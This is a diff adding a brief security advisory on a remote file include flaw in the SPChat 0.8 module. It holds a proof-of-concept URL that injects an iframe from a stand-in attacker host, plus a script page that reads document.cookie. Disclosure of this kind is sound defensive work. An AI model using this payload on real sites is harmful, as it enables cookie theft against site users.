@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/7780/info
+
+SPChat has been reported prone to a remote file include vulnerability.
+
+The issue presents itself due to insufficient sanitization performed on the user-supplied URI variable 'statussess' by the SPChat module. It is possible for a remote attacker to include a malicious file in a URL.
+
+This vulnerability was reported to affect SPChat version 0.8 other versions may also be affected. 
+
+http://www.example.com/modules.php?op=modload&name=SPChat&file=index&statussess=<IFRAME%20src="http://www.attacker.com/attack.htm"%20marginWidth=0%20marginHeight=0%20fr
+ameBorder=0%20width=500%20scrolling=yes%20height=500></IFRAME>
+
+----- Source Code For attack.htm for eg. -----
+?script>
+alert(document.cookie);
+?/script>
+----- Source Code For attack.htm ----- 
